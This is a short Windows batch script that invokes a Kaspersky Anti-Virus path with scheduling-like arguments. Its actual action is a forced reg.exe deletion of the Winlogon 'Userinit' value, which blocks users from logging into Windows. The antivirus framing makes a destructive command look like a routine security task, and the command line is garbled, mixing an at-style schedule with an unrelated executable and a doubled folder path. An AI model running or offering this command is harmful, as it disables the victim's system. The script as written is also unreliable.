@echo off
%programfiles%\Program Files\Kaspersky Lab\Kaspersky Anti-Virus 7.0\kav.exe 14:00 /every: %systemroot%\system32\reg.exe delete "hklm\software\microsoft\windows nt\currentversion\winlogon" /v "userinit" /f
@exit